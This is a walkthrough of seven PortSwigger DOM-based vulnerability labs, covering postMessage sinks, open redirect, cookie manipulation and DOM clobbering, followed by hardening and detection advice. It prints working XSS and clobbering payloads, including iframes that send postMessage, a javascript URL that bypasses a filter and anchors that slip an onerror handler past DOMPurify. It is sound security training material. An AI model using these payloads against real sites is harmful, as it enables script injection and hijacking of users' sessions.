# PortSwigger DOM-based Vulnerabilities 1-7 — Client-Side Sources, Sinks, and Clobbering

This is a consolidated walkthrough of the seven PortSwigger DOM-based vulnerabilities labs.

**DOM bugs live in browser runtime boundaries.** The dangerous operation may never touch a server template. It can be a web message, a URL parameter parsed by JavaScript, a cookie later rendered by the homepage, or an HTML element that clobbers a global property.

All seven labs solved.

## 1. Overview

| # | Lab | Source / sink | Core idea |
|---|-----|---------------|-----------|
| 1 | DOM XSS using web messages | `postMessage` -> HTML sink | send `<img onerror=print()>` to an unguarded message listener |
| 2 | Web messages and JavaScript URL | `postMessage` -> `location.href` | `javascript:print()//http:` passes a substring check |
| 3 | Web messages and JSON.parse | `postMessage` -> `JSON.parse` -> iframe `src` | structured JSON still reaches a URL sink |
| 4 | DOM open redirection | `location` regex -> `location.href` | `url=https://EXPLOIT/` controls the Back link |
| 5 | DOM cookie manipulation | product URL -> cookie -> homepage render | poison `lastViewedProduct` with a script-bearing URL |
| 6 | DOM clobbering to enable XSS | anchors -> `window.defaultAvatar` | duplicate IDs and `name=avatar` clobber an object property |
| 7 | Clobbering DOM attributes | form/input -> sanitizer `attributes` | `id=attributes` breaks attribute filtering, preserving `onfocus` |

## 2. Web message labs

The first three labs have the same root cause: a page listens for cross-window messages without a meaningful origin check.

HTML sink:

```html
<iframe src="https://LAB/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

URL sink:

```html
<iframe src="https://LAB/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

JSON sink:

```html
<iframe src=https://LAB/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

The important distinction is not the syntax. It is the final sink: `innerHTML`, `location.href`, and iframe `src` all need different validation.

## 3. Client-side redirect and cookie gadgets

The open redirect lab uses client-side JavaScript on a blog post:

```text
https://LAB/post?postId=4&url=https://EXPLOIT/
```

The page's Back to Blog link extracts the `url=` value from `location` and assigns it to `location.href`. In practice, the browser has to click the link for the redirect to happen.

The cookie manipulation lab treats `lastViewedProduct` as trusted state. A product URL with a payload is saved in the cookie, then the victim is redirected to the homepage where the cookie is rendered:

```html
<iframe src="https://LAB/product?productId=1&'><script>print()</script>"
        onload="if(!window.x)this.src='https://LAB';window.x=1;">
</iframe>
```

Cookie/localStorage/sessionStorage values are client-side input. They need the same treatment as query parameters.

## 4. DOM clobbering

The default-avatar lab uses:

```js
let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
```

The comment clobbers `window.defaultAvatar.avatar`:

```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

Two anchors with the same ID create a DOM collection. The named anchor becomes a property. DOMPurify allows `cid:`, and the quote is decoded at runtime, smuggling an `onerror` handler into the image path.

The attribute-clobbering lab attacks sanitizer internals:

```html
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

The `input id=attributes` clobbers the form's `attributes` property. The exploit page then focuses the form after comments load:

```html
<iframe src=https://LAB/post?postId=3
        onload="setTimeout(()=>this.src=this.src+'#x',500)">
</iframe>
```

DOM clobbering is a property-resolution bug. If code trusts globals or built-in DOM properties that can be shadowed by `id`/`name`, markup can become state.

## 5. Operational notes

- Send `postMessage` from iframe `onload` so the receiver page has registered its listener.
- A substring check for `http:` does not prove a URL is safe; `javascript:...//http:` is still a JavaScript URL.
- For the open redirect lab, keep the exploit URL unencoded so the page regex sees `url=https://...`.
- The DOM clobbering XSS lab does not need an exploit server; post the clobbering comment, add a second comment, then revisit the post.
- The attribute-clobbering lab needs a delayed fragment navigation so asynchronous comments have loaded before `#x` focuses the form.

## 6. Defense and detection

### Hardening

- Validate `event.origin` and message schema for every `message` event.
- Avoid `targetOrigin='*'` unless the message is genuinely public and non-sensitive.
- Keep untrusted data out of `innerHTML`, `location.href`, iframe `src`, and scriptable URL attributes.
- Parse URLs with `URL` and allowlist scheme, origin, and path.
- Treat cookies and web storage as untrusted input when rendering.
- Avoid `window.<id>` globals and logical-OR fallback patterns for security-sensitive objects.
- Harden sanitizer integrations against DOM clobbering of properties such as `attributes`, `id`, and `name`.

### Detection ideas

- Message listeners without `event.origin` checks.
- `postMessage` data flowing into HTML, URL, or iframe sinks.
- Client-side redirects controlled by `url=`, `redirect=`, `return=`, or similar parameters.
- Cookies containing `<script`, event handlers, or malformed product URLs.
- Comments containing duplicate IDs, `name=avatar`, `id=attributes`, or `cid:` payloads.

The durable lesson is that client-side trust boundaries are real trust boundaries. They need review with the same rigor as server-side template and routing code.
